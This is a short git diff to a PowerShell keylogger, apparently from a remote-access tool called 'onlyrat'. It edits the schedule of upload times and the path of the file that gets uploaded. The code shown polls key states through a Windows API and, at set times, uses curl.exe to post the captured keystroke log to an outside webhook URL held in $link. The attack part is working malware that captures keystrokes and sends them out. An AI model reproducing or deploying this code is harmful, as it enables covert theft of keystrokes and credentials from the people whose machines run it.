@@ -41,10 +41,7 @@ $logTimes = @(
     '20:00:00',
     '21:00:00',
     '22:00:00',
-    '23:00:00',
-    '22:18:00',
-    '19:26:00',
-    '19:30:00'
+    '23:00:00'
 )
 
 # sort the times in chronological order
@@ -85,13 +82,12 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
           if($time -ceq $t)
           {
               "# Sending file logs" 
-              Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:temp/$env:UserName.log```" $link"
+              Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$logFile```" $link"
               New-Item -Path $logFile -ItemType File -Force
               Start-Sleep -Seconds 1
               
           }
           else{
-            "# Executing keylogger"
             for ($ascii = 9; $ascii -le 254; $ascii++) {
   
               # use API to get key state
